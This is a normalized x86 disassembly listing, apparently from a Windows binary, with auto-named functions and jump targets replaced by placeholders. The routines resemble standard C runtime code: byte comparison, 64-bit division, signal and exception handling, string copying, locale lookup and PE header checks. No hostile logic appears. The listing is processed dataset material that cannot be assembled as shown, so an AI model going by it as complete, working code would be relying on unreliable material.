setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_427000
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_427060
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_427113
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_427157
push 0x20
push r--data
call sub_421220
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_41e7f9
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_421265
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_427113
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_41f338
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_4251cf
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_41e6c2
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4272be
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_427300
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_427390
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_427915
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_427934
jmp r-xdata
sub_427390
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_41ac09
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_427300
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4273f2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_427422
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_427452
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_41e6c2
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_4275be
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_41c34a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_41efd5
mov eax esi
jmp r-xdata
sub_42768b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_4276a6
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_4276e5
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_41ac09
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_41b9bc
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_41ae2a
pop ecx
cmp eax esi
je r-xdata
call sub_423af0
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_4277bf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4276e5
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_427800
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427820
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_41ac09
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_427865
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_427865
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_427820
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_427915
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_427934
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_42790c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_427915
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_427940
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_427980
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4279d0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_421280
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_427940
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_427980
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427a8c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_42a07c
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
